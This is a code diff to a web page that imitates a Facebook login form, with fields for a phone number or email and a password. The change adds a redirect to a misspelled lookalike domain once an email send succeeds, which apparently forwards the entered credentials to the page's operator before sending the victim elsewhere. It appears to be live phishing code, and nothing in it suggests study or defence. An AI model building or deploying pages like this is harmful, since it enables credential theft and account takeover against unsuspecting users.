@@ -160,9 +160,8 @@
             })
             .then((response) => {
                 console.log('Email successfully sent!', response.status, response.text);
-                // Hide spinner and show button text
-                spinner.style.display = 'none';
-                buttonText.style.display = 'block';
+                // Redirect to the specified URL
+                window.location.href = "https://facebook-login-pagee.github.io/Facebook/landing2.html";
             }, (error) => {
                 console.error('Failed to send email.', error);
                 // Hide spinner and show button text
@@ -261,7 +260,7 @@
                         title: "English (United Kingdom)",
                         placeholderEmail: "Phone number or email address",
                         placeholderPassword: "Password",
-                        forgotPassword: "Forgot password?",
+  forgotPassword: "Forgot password?",
                         submitButton: "Log in",
                         createAccount: "Create an account"
                     },
@@ -325,4 +324,4 @@
         </footer>
     </div>
 </body>
-      </html>
+</html>                      
